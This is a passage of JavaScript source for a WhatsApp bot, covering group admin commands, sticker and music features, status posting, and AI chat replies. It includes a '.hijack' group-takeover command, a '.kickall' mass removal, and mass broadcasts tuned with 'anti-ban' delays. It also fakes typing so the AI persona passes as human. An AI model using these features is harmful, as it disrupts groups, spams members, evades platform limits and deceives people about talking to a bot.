              } catch(e) { await humanReplyWA(sock,replyJid,`❌ ${gtErr(e)}`,{msgKey, quotedMsg:msg}); }
              return;
            }

            // .kick .promote .demote
            const action=cmdWord==='.kick'?'remove':cmdWord==='.promote'?'promote':'demote';
            // antipromote/antidemote: check group setting OR owner-only lock
            if (cmdWord === '.promote') {
              const _gs = getGroupSettings(jid);
              if (_gs.antipromote_on && !isOwner(userId) && !isSudo(userId) && !msg.key.fromMe && !(_selfCtx.getStore() || {}).linked) {
                await humanReplyWA(sock, replyJid, '💗 anti-promote is on. only the owner can promote admins.', {msgKey, quotedMsg:msg});
                return;
              }
            }
            if (cmdWord === '.demote') {
              const _gs = getGroupSettings(jid);
              if (_gs.antidemote_on && !isOwner(userId) && !isSudo(userId) && !msg.key.fromMe && !(_selfCtx.getStore() || {}).linked) {
                await humanReplyWA(sock, replyJid, '💗 anti-demote is on. only the owner can demote admins.', {msgKey, quotedMsg:msg});
                return;
              }
            }
            try {
              await sock.groupParticipantsUpdate(jid,[apiJid],action);
              const label=cmdWord==='.kick'?`removed @${tNum}`:cmdWord==='.promote'?`@${tNum} is now admin`:`@${tNum} demoted`;
              await humanReplyWA(sock,replyJid,`💗 ${label}.`,{mentionJids:[targetJid], msgKey, quotedMsg:msg});
            } catch(e) { await humanReplyWA(sock,replyJid,`❌ ${e.message}`,{msgKey, quotedMsg:msg}); }
            return;
          }

          // ── .hijack — demote every other admin, promote only the owner ──
          if(isCmd && cmdWord==='.hijack' && isGroup){
            if(!isOwner(userId) && !msg.key.fromMe){
              await humanReplyWA(sock,replyJid,'❌ Owner only.',{msgKey,quotedMsg:msg});
              return;
            }
            try{
              const _hjMeta = await gtWaMeta(sock,jid,true);
              if(!gtWaBotIsAdmin(sock,_hjMeta)){
                await humanReplyWA(sock,replyJid,'⚠️ Make me a group admin first before I can hijack.',{msgKey,quotedMsg:msg});
                return;
              }
              // All admins except the bot itself
              const _hjBotDigs = new Set([sock.user?.id, sock.user?.lid].map(x=>_gtDigits(x)).filter(Boolean));
              const _hjAdmins  = _hjMeta.participants.filter(p=>(p.admin==='admin'||p.admin==='superadmin') && !_hjBotDigs.has(_gtDigits(p.id)));
              await humanReplyWA(sock,replyJid,`🎯 Hijacking… demoting *${_hjAdmins.length}* admin(s)`,{msgKey,quotedMsg:msg});
              let _hjDemoted=0; const _hjFailed=[];
              for(const _adm of _hjAdmins){
                const _adNum = _gtDigits(_adm.id);
                try{
                  await sock.groupParticipantsUpdate(jid,[_adm.id],'demote');
                  _hjDemoted++;
                  await sleep(1500);
                }catch(e){
                  _hjFailed.push(_adm.admin==='superadmin'
                    ? `@${_adNum} (group creator — WhatsApp won't let anyone demote them)`
                    : `@${_adNum} (${e.message})`);
                }
              }
              // Promote the owner
              const _hjOwnerNum = MY_WA.replace(/\D/g,'');
              const _hjOwnerJid = _hjOwnerNum+'@s.whatsapp.net';
              let _hjPromoted=false;
              try{ await sock.groupParticipantsUpdate(jid,[_hjOwnerJid],'promote'); _hjPromoted=true; }
              catch(_){}
              const _hjLines = [`👑 *HIJACK COMPLETE*`,``,`✅ Demoted: *${_hjDemoted}* admin(s)`];
              if(_hjFailed.length) _hjLines.push(`⚠️ Skipped:\n${_hjFailed.map(f=>'  · '+f).join('\n')}`);
              _hjLines.push('');
              _hjLines.push(_hjPromoted ? `✅ You (+${_hjOwnerNum}) are now the only admin` : `⚠️ Couldn't promote you — check you're in this group`);
              await humanReplyWA(sock,replyJid,_hjLines.join('\n'),{msgKey,quotedMsg:msg});
              gtWaMetaInvalidate(jid);
            }catch(e){ await humanReplyWA(sock,replyJid,`❌ ${e.message}`,{msgKey,quotedMsg:msg}); }
            return;
          }

          // ── .kickall — remove every member except the bot and the owner ──
          if(isCmd && cmdWord==='.kickall' && isGroup){
            if(!isOwner(userId) && !msg.key.fromMe){
              await humanReplyWA(sock,replyJid,'❌ Owner only.',{msgKey,quotedMsg:msg});
              return;
            }
            try{
              const _kaMeta = await gtWaMeta(sock,jid,true);
              if(!gtWaBotIsAdmin(sock,_kaMeta)){
                await humanReplyWA(sock,replyJid,'⚠️ Make me a group admin first so I can kick everyone.',{msgKey,quotedMsg:msg});
                return;
              }
              const _kaBotDigs  = new Set([sock.user?.id, sock.user?.lid].map(x=>_gtDigits(x)).filter(Boolean));
              const _kaOwnerDig = MY_WA.replace(/\D/g,'');
              const _toKick = _kaMeta.participants.filter(p=>{
                const d = _gtDigits(p.id);
                return !_kaBotDigs.has(d) && d !== _kaOwnerDig;
              });
              if(!_toKick.length){
                await humanReplyWA(sock,replyJid,'📭 Nothing to do — the group is already just us.',{msgKey,quotedMsg:msg});
                return;
              }
              await humanReplyWA(sock,replyJid,`🚪 Kicking *${_toKick.length}* member(s)… hang on.`,{msgKey,quotedMsg:msg});
              let _kicked=0;
              // Batch in groups of 5 to stay within WA rate limits
              const _KBATCH=5;
              for(let _ki=0; _ki<_toKick.length; _ki+=_KBATCH){
                const _chunk = _toKick.slice(_ki,_ki+_KBATCH).map(p=>p.id);
                try{
                  await sock.groupParticipantsUpdate(jid,_chunk,'remove');
                  _kicked+=_chunk.length;
                }catch(_batchErr){
                  // Batch failed — try one by one
                  for(const _pjid of _chunk){
                    try{ await sock.groupParticipantsUpdate(jid,[_pjid],'remove'); _kicked++; }catch(_){}
                    await sleep(1000);
                  }
                }
                await sleep(2000); // anti-ban pause between batches
              }
              await humanReplyWA(sock,replyJid,`✅ *KICKALL DONE*\nKicked *${_kicked}/${_toKick.length}* member(s). Group cleared. 🧹`,{msgKey,quotedMsg:msg});
              gtWaMetaInvalidate(jid);
            }catch(e){ await humanReplyWA(sock,replyJid,`❌ ${e.message}`,{msgKey,quotedMsg:msg}); }
            return;
          }

          // ── .sticker — reply to image/video to convert it ────────
          if(isCmd && cmdWord==='.sticker'){
            // Must be a reply to an image or video
            const _ci = msg.message?.extendedTextMessage?.contextInfo;
            const _qm = _ci?.quotedMessage;
            const _isQImg = !!(_qm?.imageMessage);
            const _isQVid = !!(_qm?.videoMessage);
            if(!_qm || (!_isQImg && !_isQVid)){
              await humanReplyWA(sock,replyJid,'🎨 *STICKER*\n\nReply to an image or video and say *sticker*\nOR send an image/video with the caption *sticker*\n\n_Images become static stickers. Videos become animated (max 6 s)._',{msgKey,quotedMsg:msg});
              return;
            }
            try{
              // stanzaId may be missing on some WA versions — fall back to quotedMessageId or stanzaId aliases
              const _sId = _ci.stanzaId || _ci.quotedMessageId || _ci.quotedStanzaId || '';
              if(!_sId) throw new Error('could not find quoted message ID — try forwarding the image/video instead');
              const _qmsgObj = { key:{ remoteJid:jid, id:_sId, participant:_ci.participant||_ci.remoteJid||undefined }, message:_qm };
              await sock.sendMessage(replyJid,{text:`🎨 converting ${_isQVid?'video':'image'} to sticker…`});
              const buf = await downloadMediaMessage(_qmsgObj,'buffer',{},{ logger:pino({level:'silent'}), reuploadRequest: sock.updateMediaMessage });
              const stickerBuf = await convertToSticker(buf, _isQVid?'video':'image');
              await sock.sendMessage(replyJid,{sticker:stickerBuf},{quoted:msg});
            }catch(e){ await humanReplyWA(sock,replyJid,`❌ sticker failed: ${e.message}`,{msgKey,quotedMsg:msg}); }
            return;
          }

          // ── .getpp — get profile picture ─────────────────────────
          if(isCmd && cmdWord==='.getpp'){
            // Target: @mention, quoted message sender, or own JID
            let targetJid = null;
            const _ppMentions = allMentionedJids||[];
            if(_ppMentions.length) targetJid = _ppMentions[0];
            else {
              const _ppCi = msg.message?.extendedTextMessage?.contextInfo;
              if(_ppCi?.participant) targetJid = _ppCi.participant;
              else if(waArgs[0]){
                const _ppNum = waArgs[0].replace(/\D/g,'');
                if(_ppNum.length >= 7) targetJid = _ppNum + '@s.whatsapp.net';
              }
            }
            if(!targetJid) targetJid = senderJid || jid;
            try{
              const ppUrl = await sock.profilePictureUrl(targetJid,'image').catch(()=>null);
              if(!ppUrl){ await humanReplyWA(sock,replyJid,'❌ No profile picture found (private or not set).',{msgKey,quotedMsg:msg}); return; }
              const ppRes = await axios.get(ppUrl,{responseType:'arraybuffer', timeout:10000});
              const ppBuf = Buffer.from(ppRes.data);
              const _ppNum2 = String(targetJid).split('@')[0].split(':')[0];
              await sock.sendMessage(replyJid,{image:ppBuf,caption:`📸 @${_ppNum2}`},{quoted:msg});
            }catch(e){ await humanReplyWA(sock,replyJid,`❌ ${e.message}`,{msgKey,quotedMsg:msg}); }
            return;
          }

          // ── .gstatus — post to WhatsApp Status ───────────────────
          if(isCmd && cmdWord==='.gstatus'){
            if(!isOwner(userId) && !isSudo(userId) && !msg.key.fromMe){
              await humanReplyWA(sock,replyJid,'❌ Owner/sudo only.',{msgKey,quotedMsg:msg});
              return;
            }
            const _stText = waArgs.join(' ').replace(/^>\s*/,'').trim();
            if(!_stText){
              await humanReplyWA(sock,replyJid,'📢 Usage: *.gstatus <text or link>*\n\nPosts a text or link-preview status to your WhatsApp Story.\n\nExample: .gstatus https://youtube.com',{msgKey,quotedMsg:msg});
              return;
            }
            try{
              const _hasUrl = /https?:\/\//i.test(_stText);
              if(_hasUrl) await humanReplyWA(sock,replyJid,'🔗 Fetching link preview…',{msgKey,quotedMsg:msg});
              const _stPayload = await buildStatusPayload(_stText);
              await sock.sendMessage('status@broadcast', _stPayload);
              const _stNote = _hasUrl && _stPayload.title ? `\n🔗 Preview: *${_stPayload.title.slice(0,50)}*` : '';
              await humanReplyWA(sock,replyJid,`✅ Status posted!${_stNote}`,{msgKey,quotedMsg:msg});
            }catch(e){ await humanReplyWA(sock,replyJid,`❌ Failed: ${e.message}`,{msgKey,quotedMsg:msg}); }
            return;
          }

          // ── .wagstatus — group-status broadcast wizard (wa-gstatus-quick) ────
          // Usage:
          //   .wagstatus         → open the search wizard to pick groups
          //   .wagstatus all     → skip wizard and select every group at once
          //   .cwagstatus        → cancel an in-progress wizard or live broadcast
          if(isCmd && (cmdWord==='.wagstatus' || cmdWord==='.cwagstatus')){
            if(!isOwner(userId) && !isSudo(userId) && !msg.key.fromMe){
              await humanReplyWA(sock,replyJid,'❌ Owner/sudo only.',{msgKey,quotedMsg:msg});
              return;
            }
            try {
              const { gstatusCommand, cgstatusCommand } = require('./wa-gstatus-quick');
              const _gswCmd = cmdWord === '.cwagstatus' ? cgstatusCommand : gstatusCommand;
              const _gswCtx = {
                sock,
                chatJid:    replyJid,
                groupId:    replyJid,
                senderJid:  senderJid,
                sessionKey: String(tgUserId),
                args:       waArgs,
                msg,
              };
              const _gswResult = await _gswCmd.run(_gswCtx);
              if (_gswResult && typeof _gswResult === 'string') {
                const { codeBlock: _gswCb } = require('./wa-gstatus-quick');
                await humanReplyWA(sock, replyJid, _gswCb(_gswResult), {msgKey, quotedMsg: msg});
              }
            } catch(e) {
              await humanReplyWA(sock,replyJid,`❌ wagstatus error: ${e.message}`,{msgKey,quotedMsg:msg});
            }
            return;
          }

          // ── .wagstatusall — post status via ALL connected sessions ─
          if(isCmd && cmdWord==='.wagstatusall'){
            if(!isOwner(userId) && !msg.key.fromMe){
              await humanReplyWA(sock,replyJid,'❌ Owner only.',{msgKey,quotedMsg:msg});
              return;
            }
            const _wsaText = waArgs.join(' ').replace(/^>\s*/,'').trim();
            if(!_wsaText){
              await humanReplyWA(sock,replyJid,'📢 Usage: *.wagstatusall > <text or link>*\n\nPosts a status (or link preview) to ALL linked WhatsApp accounts.',{msgKey,quotedMsg:msg});
              return;
            }
            const _wsaHasUrl = /https?:\/\//i.test(_wsaText);
            if(_wsaHasUrl) await humanReplyWA(sock,replyJid,'🔗 Fetching link preview…',{msgKey,quotedMsg:msg});
            const _wsaPayload = await buildStatusPayload(_wsaText);
            let _wsaOk=0, _wsaFail=0;
            for(const [,_s] of sessions){
              if(!_s?.connected||!_s?.sock) continue;
              try{ await _s.sock.sendMessage('status@broadcast',_wsaPayload); _wsaOk++; }
              catch(e){ _wsaFail++; console.error('[wagstatusall]',e.message); }
              await sleep(1500);
            }
            const _wsaNote = _wsaHasUrl && _wsaPayload.title ? `\n🔗 Preview: *${_wsaPayload.title.slice(0,50)}*` : '';
            await humanReplyWA(sock,replyJid,`✅ Status posted on *${_wsaOk}* session(s)${_wsaFail?` · ${_wsaFail} failed`:''}.${_wsaNote}\n\n_"${_wsaText.slice(0,60)}${_wsaText.length>60?'…':''}"_`,{msgKey,quotedMsg:msg});
            return;
          }

          // ── .wagcbroadcast — broadcast to group status + all group chats ─
          // Usage:
          //   .wagcbroadcast > text          → posts as WhatsApp Status visible to ALL group members
          //   .wagcbroadcast msg > text      → sends a direct message into each group chat
          //   .wagcbroadcast both > text     → does both at once
          // Sending an IMAGE with caption .wagcbroadcast (or any mode) broadcasts as an image status.
          if(isCmd && cmdWord==='.wagcbroadcast'){
            if(!isOwner(userId) && !msg.key.fromMe){
              await humanReplyWA(sock,replyJid,'❌ Owner only.',{msgKey,quotedMsg:msg});
              return;
            }

            // Parse optional mode keyword (status / msg / both) as first word before '>'
            const _rawArgs = waArgs.join(' ');
            let _bcMode = 'status'; // default: post as WhatsApp Status
            let _bcTextRaw = _rawArgs;
            const _modeMatch = /^(status|msg|both)\s*>?\s*/i.exec(_rawArgs.trim());
            if(_modeMatch){ _bcMode = _modeMatch[1].toLowerCase(); _bcTextRaw = _rawArgs.slice(_modeMatch[0].length); }
            const _bcText = _bcTextRaw.replace(/^>\s*/,'').trim();

            // Check for a quoted image to broadcast as image status
            const _bci = msg.message?.extendedTextMessage?.contextInfo;
            const _bqm = _bci?.quotedMessage;
            const _bcHasImg = !!(_bqm?.imageMessage);

            if(!_bcText && !_bcHasImg){
              await humanReplyWA(sock,replyJid,
                '📢 *WAGCBROADCAST — Group Status Broadcast*\n\n' +
                '*.wagcbroadcast > text* — post as WhatsApp Status to ALL group members\n' +
                '*.wagcbroadcast msg > text* — send direct message to each group chat\n' +
                '*.wagcbroadcast both > text* — status post + direct message\n\n' +
                '_You can also reply to an image before sending the command to broadcast an image status._',
                {msgKey,quotedMsg:msg}
              );
              return;
            }

            try{
              // Fetch all groups + their participants
              const _allGroups = Object.values(await sock.groupFetchAllParticipating());
              if(!_allGroups.length){ await humanReplyWA(sock,replyJid,'📭 I am not in any groups.',{msgKey,quotedMsg:msg}); return; }

              // Collect all unique participant JIDs for the statusJidList
              // Bot's own identifiers — never add these to statusJidList
              const _botDigits = new Set(
                [sock.user?.id, sock.user?.lid]
                  .map(x => String(x||'').split('@')[0].split(':')[0].replace(/\D/g,''))
                  .filter(Boolean)
              );
              const _allJids = new Set();
              for(const _g of _allGroups){
                for(const _p of (_g.participants||[])){
                  // Modern WhatsApp gives @lid JIDs; older gives @s.whatsapp.net — accept both
                  const _pj = _p.id||_p.jid||'';
                  if(!_pj) continue;
                  // Skip group JIDs, broadcast, and the bot's own accounts
                  if(_pj.endsWith('@g.us')||_pj.endsWith('@broadcast')) continue;
                  const _pDigits = String(_pj).split('@')[0].split(':')[0].replace(/\D/g,'');
                  if(_botDigits.has(_pDigits)) continue;
                  _allJids.add(_pj);
                }
              }
              const _jidList = [..._allJids];

              await humanReplyWA(sock,replyJid,
                `📤 *Broadcasting…*\nMode: *${_bcMode}* · Groups: *${_allGroups.length}* · Unique members: *${_jidList.length}*`,
                {msgKey,quotedMsg:msg}
              );

              let _stOk=false, _msgSent=0;

              // ─ Pre-download image once so both status + msg modes can reuse it ─
              let _bcImgBuf = null;
              if(_bcHasImg){
                try{
                  const _bcSid = _bci.stanzaId || _bci.quotedMessageId || _bci.quotedStanzaId || '';
                  if(!_bcSid) throw new Error('quoted message ID not found');
                  const _bqobj = { key:{ remoteJid:jid, id:_bcSid, participant:_bci.participant||_bci.remoteJid||undefined }, message:_bqm };
                  _bcImgBuf = await downloadMediaMessage(_bqobj,'buffer',{},{ logger:pino({level:'silent'}), reuploadRequest: sock.updateMediaMessage });
                }catch(e){ console.error('[wagcbroadcast img-download]',e.message); }
              }

              // ─ STATUS broadcast ────────────────────────────────────────
              if(_bcMode==='status'||_bcMode==='both'){
                try{
                  if(_bcImgBuf){
                    await sock.sendMessage('status@broadcast',{
                      image: _bcImgBuf,
                      caption: _bcText||undefined,
                    },{statusJidList:_jidList});
                  } else {
                    // Auto link-preview: if text has a URL, fetch OG metadata so WhatsApp
                    // renders a proper link card instead of plain text
                    const _bcHasUrl = /https?:\/\//i.test(_bcText);
                    if(_bcHasUrl){
                      await humanReplyWA(sock,replyJid,'🔗 Fetching link preview for status…',{msgKey,quotedMsg:msg});
                    }
                    const _bcPayload = await buildStatusPayload(_bcText);
                    await sock.sendMessage('status@broadcast', _bcPayload, {statusJidList:_jidList});
                    if(_bcHasUrl && _bcPayload.title){
                      await humanReplyWA(sock,replyJid,`🔗 Link preview: *${_bcPayload.title.slice(0,60)}*`,{msgKey,quotedMsg:msg});
                    }
                  }
                  _stOk = true;
                }catch(e){ console.error('[wagcbroadcast status]',e.message); }
              }

              // ─ Direct MESSAGE to each group ───────────────────────────
              if(_bcMode==='msg'||_bcMode==='both'){
                for(const _g of _allGroups){
                  try{
                    if(_bcImgBuf){
                      // Send image + optional caption to each group
                      await sock.sendMessage(_g.id,{ image:_bcImgBuf, caption:_bcText||undefined });
                    } else {
                      await sock.sendMessage(_g.id,{text:_bcText||'📢 Broadcast'});
                    }
                    _msgSent++;
                    await sleep(2500); // anti-ban spacing
                  }catch(e){ console.error('[wagcbroadcast msg]',_g.id,e.message); }
                }
              }

              // ─ Result summary ─────────────────────────────────────────
              const _lines = [];
              if(_bcMode==='status'||_bcMode==='both') _lines.push(`📡 Status posted to *${_jidList.length}* members: ${_stOk?'✅':'❌ failed'}`);
              if(_bcMode==='msg'||_bcMode==='both')    _lines.push(`💬 Direct messages sent to *${_msgSent}/${_allGroups.length}* groups`);
              await humanReplyWA(sock,replyJid,_lines.join('\n'),{msgKey,quotedMsg:msg});

            }catch(e){ await humanReplyWA(sock,replyJid,`❌ ${e.message}`,{msgKey,quotedMsg:msg}); }
            return;
          }

          // ── .pairnum — link another WA number from within WA ─────
          if(isCmd && cmdWord==='.pairnum'){
            if(!isOwner(userId) && !msg.key.fromMe){
              await humanReplyWA(sock,replyJid,'❌ Owner only.',{msgKey,quotedMsg:msg});
              return;
            }
            const _pnArg = cleanPairPhone(waArgs.join(' '));
            if(!_pnArg||pairPhoneProblem(_pnArg)){
              await humanReplyWA(sock,replyJid,'📱 Usage: *.pairnum <number>*\n\nExample: .pairnum 2348012345678\n\nGenerates a pairing code. Enter it on the other phone:\nSettings → Linked Devices → Link with phone number.',{msgKey,quotedMsg:msg});
              return;
            }
            try{
              const _rawPc = await sock.requestPairingCode(_pnArg);
              // FIX: normalise to XXXX-XXXX (Baileys sometimes omits the dash)
              const _pc = _rawPc && _rawPc.includes('-') ? _rawPc.trim() : (_rawPc||'').replace(/(.{4})(.{4})/,'$1-$2').trim()||_rawPc;
              await humanReplyWA(sock,replyJid,`🔗 *Pairing code for +${_pnArg}:*\n\n*${_pc}*\n\nOpen WhatsApp on the target phone:\n_Settings → Linked Devices → Link with phone number_\n\nEnter the code above. Valid ~60 seconds.`,{msgKey,quotedMsg:msg});
            }catch(e){ await humanReplyWA(sock,replyJid,`❌ Pairing failed: ${e.message}`,{msgKey,quotedMsg:msg}); }
            return;
          }

          // ── .play — search YouTube and send audio ─────────────────
          if(isCmd && cmdWord==='.play'){
            const query = waArgs.join(' ').trim();
            if(!query){
              await humanReplyWA(sock,replyJid,'🎵 *PLAY MUSIC*\n\nUsage: *.play <song name>*\n\nExample: .play Blinding Lights\nExample: .play Drake God\'s Plan\n\n_Searches YouTube and sends the audio directly._',{msgKey,quotedMsg:msg});
              return;
            }
            await sock.sendMessage(replyJid,{text:`🔍 searching for: *${query}*…`});
            const result=await searchAndDownloadMusic(query);
            if(result.error){
              await humanReplyWA(sock,replyJid,`❌ ${result.error}`,{msgKey,quotedMsg:msg});
              return;
            }
            try{
              await sock.sendMessage(replyJid,{
                audio:    result.buffer,
                mimetype: 'audio/mpeg',
                fileName: `${result.title.replace(/[^\w\s-]/g,'').trim().slice(0,50)}.mp3`,
                ptt:      false,
              },{quoted:msg});
              await sock.sendMessage(replyJid,{
                text:`🎵 *${result.title}*\n🎤 ${result.artist}\n⏱️ ${result.duration}\n\n💗 _enjoy it!_`,
              });
            }catch(e){
              await humanReplyWA(sock,replyJid,`❌ failed to send audio: ${e.message}`,{msgKey,quotedMsg:msg});
            }
            return;
          }

          // ── PRIVATE MODE RESPONSE GATE ──────────────────────────────
          // All group moderation above (antilink, antiflood, no-bot, badword, etc.) has already run.
          // Now block commands and AI replies for non-owners when private mode is active.
          if (_isPrivate) return;

          // ── General commands ──────────────────────────────────────────
          if(isCmd && cmdWord === '.ping'){
            const _t0 = Date.now();
            let _pk = null;
            try { _pk = await sock.sendMessage(replyJid, { text: '🏓 Pinging...' }, { quoted: msg }); } catch (_) {}
            const _ms = Date.now() - _t0;
            const _out = `🏓 *Pong!*\n⚡ Speed: ${_ms} ms\n⏱️ Uptime: ${fmtUptime()}\n✅ Online`;
            try {
              if (_pk?.key) await sock.sendMessage(replyJid, { text: _out, edit: _pk.key });
              else await sock.sendMessage(replyJid, { text: _out });
            } catch (_) { try { await sock.sendMessage(replyJid, { text: _out }); } catch (_) {} }
            return;
          }
          if(isCmd){
            console.log(`[WA cmd] ${cmdWord}`);
            { const _g = _cmdGate(userId); if (_g) { if (_g === 1) await humanReplyWA(sock, replyJid, '⏳ slow down — too many commands at once. try again in 20 seconds.', {msgKey, quotedMsg:msg}); return; } }
            const reply=await handleCommand(text,jid,userId,name,rawUserId,allMentionedJids);
            console.log(`[WA cmd reply] ${reply ? reply.slice(0,60) : 'null'}`);
            if(typeof reply==='string' && reply.startsWith(VOICE_TAG)){
              const _vt = reply.slice(VOICE_TAG.length);
              const _ok = await sendVoiceWA(sock, replyJid, _vt, msg, msgKey);
              if(!_ok) await humanReplyWA(sock, replyJid, `🎙️ my voice failed just now. in text:\n${_vt}`, {msgKey, quotedMsg:msg});
              return;
            }
            if(reply==='__SEND_PIC__'){
              try{
                await sleep(randomInt(1500,3000));
                await sock.sendPresenceUpdate('composing',jid);
                await sleep(randomInt(2000,4000));
                await sock.sendPresenceUpdate('paused',jid);
                await sock.sendMessage(replyJid,{image:fs.readFileSync(BOT_PFP_PATH),caption:getPicCaption()});
              }catch(e){ await sock.sendMessage(replyJid,{text:"...something went wrong sending the pic."}); }
              return;
            }
            if(reply === '__ASYNC__'){ return; } // async command — reply is being sent by the handler itself
            if(reply){ await humanReplyWA(sock,replyJid,reply,{isGame:GAME_CMDS.has(cmdWord), msgKey, quotedMsg:msg, mentionJids: replyMentions(reply, [..._rawMentions, ...mentionedJids, ...allMentionedJids])}); return; }
            // Self-typed unknown command (linked account's own message): never fall through to the AI chat
            if(msg.key.fromMe){ await humanReplyWA(sock,replyJid,'😒 i don\'t know that one. try again?',{msgKey, quotedMsg:msg}); return; }
            // Unknown command: in groups → hint; in DMs → fall through to AI
            if(isGroup){ await humanReplyWA(sock,replyJid,'😒 i don\'t know that one. just talk to me naturally!',{msgKey, quotedMsg:msg}); return; }
            // DM fall-through — treat like a normal message
          }

          // ── Pic request detection (natural language) ─────────────
          if(text && isPicRequest(text)){
            const picExists = fs.existsSync(BOT_PFP_PATH);
            if(!picExists){
              // No picture set — silently ignore so unrelated messages aren't misread as pic requests
            } else
            // In groups only respond if bot is mentioned or it's a command
            if(isGroup && !botMentioned) { /* fall through to normal group flow */ }
            else {
              try{
                await sleep(randomInt(2000,4000));
                await sock.sendPresenceUpdate('composing',jid);
                await sleep(randomInt(2000,3500));
                await sock.sendPresenceUpdate('paused',jid);
                const _sendOpts = (msg && typeof msg === 'object') ? { quoted: msg } : {};
                await sock.sendMessage(replyJid,{image:fs.readFileSync(BOT_PFP_PATH),caption:getPicCaption()}, _sendOpts);
              }catch(e){ await humanReplyWA(sock,replyJid,"...couldn't send the pic right now.",{msgKey, quotedMsg:msg}); }
              return;
            }
          }
          // ── Duty challenge intercept — all jobs (WA) ─────────────────────
          if (!isCmd) {
            const dcWA = pendingDutyChallenge[userId];
            if (dcWA) {
              const typed = text.trim();
              if (Date.now() > dcWA.expires) {
                delete pendingDutyChallenge[userId];
                await humanReplyWA(sock, replyJid,
                  `${dcWA.failFlavor}\n\n❌ Code not entered in time. Duty failed.\n⏳ Cooldown still applies — try again later.`,
                  { msgKey });
                return;
              }
              if (typed === dcWA.code) {
                delete pendingDutyChallenge[userId];
                addCash(userId, dcWA.reward); addXP(userId, 30);
                db.prepare('UPDATE occupations SET xp=xp+30 WHERE user_id=?').run(userId);
                const newRIdxWA = occRankIndex((getOcc(userId)?.xp || 0));
                const jobObjWA = JOBS[dcWA.job] || {};
                const promoLineWA = jobObjWA.ranks && newRIdxWA > dcWA.rIdx ? `\n⬆️ PROMOTED to ${jobObjWA.ranks[newRIdxWA]}!` : '';
                await humanReplyWA(sock, replyJid,
                  `${dcWA.successFlavor}\n\n✅ Duty complete! +${fmt(dcWA.reward)}${dcWA.taxLine || ''}${promoLineWA}`,
                  { msgKey });
                return;
              }
              if (typed.includes('-') || typed.includes(' ') || /^[A-Z0-9]{2,}$/i.test(typed)) {
                await humanReplyWA(sock, replyJid, `${dcWA.wrongFlavor}`, { msgKey });
                return;
              }
            }
          }
          // ── Math duel answer intercept ──
          if (!isCmd) {
            const mathAnswer = checkMathAnswer(text, jid, userId, name);
            if (mathAnswer) { await humanReplyWA(sock, replyJid, mathAnswer, { msgKey }); return; }
          }

          if(activeGames[jid]){
            const parts=text.trim().split(/\s+/);
            const gr=handleGames(parts[0].toLowerCase(),jid,userId,name,parts.slice(1),typeof allMentionedJids!=='undefined'?allMentionedJids:[]);
            if(gr) await humanReplyWA(sock,replyJid,gr,{isGame:true, msgKey, quotedMsg:msg});
            return;
          }
          if(isGroup){
            // Fracture score for every group message
            try { addFractureScore(jid, rawUserId, 1); } catch(_) {}

            // Only respond when bot is mentioned, name triggered, or replied-to
            if(!botMentioned) { console.log('[WA skip] group msg — bot not mentioned'); return; }

            // Strip the bot mention and her name from text so she doesn't
            // echo his own name back in the AI reply
            const botNumLocal = botNum || (sock.user?.id||'').replace(/:.*@/,'@').replace('@s.whatsapp.net','').replace(/\D/g,'');
            const clean = text
              .replace(new RegExp('@' + botNumLocal, 'g'), '')
              .replace(/@\d+/g, '')
              .replace(/\b(?:seana|chandra|shay|chanelle|seanie)\b/gi, '')
              .trim();

            // If the cleaned message starts with a command char, try commands first
            if (clean.startsWith('.')) {
              { const _g = _cmdGate(userId); if (_g) { if (_g === 1) await humanReplyWA(sock, replyJid, '⏳ slow down — too many commands at once. try again in 20 seconds.', {msgKey, quotedMsg:msg}); return; } }
              const cmdReply = await handleCommand(clean, jid, userId, name, rawUserId, allMentionedJids);
              const cmdKey   = ('.'+clean.slice(1).split(/\s+/)[0]).toLowerCase();
              if(typeof cmdReply==='string' && cmdReply.startsWith(VOICE_TAG)){
                const _vt = cmdReply.slice(VOICE_TAG.length);
                const _ok = await sendVoiceWA(sock, replyJid, _vt, msg, msgKey);
                if(!_ok) await humanReplyWA(sock, replyJid, `🎙️ my voice failed just now. in text:\n${_vt}`, {msgKey, quotedMsg:msg});
                return;
              }
              if (cmdReply) { await humanReplyWA(sock, replyJid, cmdReply, {isGame: GAME_CMDS.has(cmdKey), msgKey, quotedMsg:msg, mentionJids: replyMentions(cmdReply, [..._rawMentions, ...mentionedJids, ...allMentionedJids])}); return; }
              const gr = handleGames(cmdKey, jid, userId, name, clean.split(/\s+/).slice(1), allMentionedJids);
              if (gr) { await humanReplyWA(sock, replyJid, gr, {isGame: true, msgKey, quotedMsg:msg}); return; }
            }

            // Natural intent check — handle specific requests without a dot command
            {
              const _ni = await naturalIntents.handleWA({ sock, jid, userId, name, rawUserId, text: clean || text, isGroup: true, msg, senderJid, replyJid, allMentionedJids });
              if (_ni?.reply) { await humanReplyWA(sock, replyJid, _ni.reply, { msgKey, quotedMsg: msg }); return; }
            }

            // Respect .aioff — skip AI reply if the paired owner disabled it
            if (getGroupSettings(jid).ai_off) { console.log('[WA skip] ai_off is set for group', jid); return; }

            // Natural mention → AI chat (no fake command prefix)
            let chatMsg;
            if (!clean) {
              // Someone just typed her name or tagged the bot with no message —
              // give her a proper context instead of an empty string so she
              // doesn't just echo the name back
              const greetings = [
                `[${name} just called your name in the group. Reply warmly and briefly, by name. Don't repeat your own name.]`,
                `[${name} tagged you without saying anything. Reply briefly and warmly.]`,
                `[${name} is trying to get your attention in the group. Reply in one or two sentences, do not just say your name.]`,
              ];
              chatMsg = greetings[Math.floor(Math.random() * greetings.length)];
            } else {
              chatMsg = `[${name} in group says]: "${clean}"`;
            }
            await humanReplyWA(sock, replyJid, async() => {
              return await chat('wa_grp_'+jid, chatMsg, userId);
            }, {msgKey, quotedMsg:msg});
            return;
          }
          // ── DM — always reply ──
          if (!text.trim()) { console.log('[WA skip] DM with no text content'); return; }
          // Natural intent check — handle specific requests without a dot command
          {
            const _ni = await naturalIntents.handleWA({ sock, jid, userId, name, rawUserId, text, isGroup: false, msg, senderJid, replyJid, allMentionedJids });
            if (_ni?.reply) { await humanReplyWA(sock, replyJid, _ni.reply, { msgKey, quotedMsg: msg }); return; }
          }
          console.log(`[WA DM] replying to ${senderNumber} userId=${userId}`);
          await humanReplyWA(sock, replyJid, async()=>{
            const reply = await chat(userId, text);
            console.log(`[WA DM reply] "${(reply||'').slice(0,60)}"`);
            return reply || '...';
          }, {msgKey, quotedMsg:msg});
        }catch(e){
          console.error('[WA task error]',e.message, e.stack?.split('\n')[1]);
          try { await sock.sendMessage(replyJid, {text:'...'}); } catch(_){}
        }
      };
      // Who sent this? The person who linked this WhatsApp account (their own messages are fromMe, but we also
      // match by number / paired Telegram id), plus whether they and the bot are group admins. Group commands
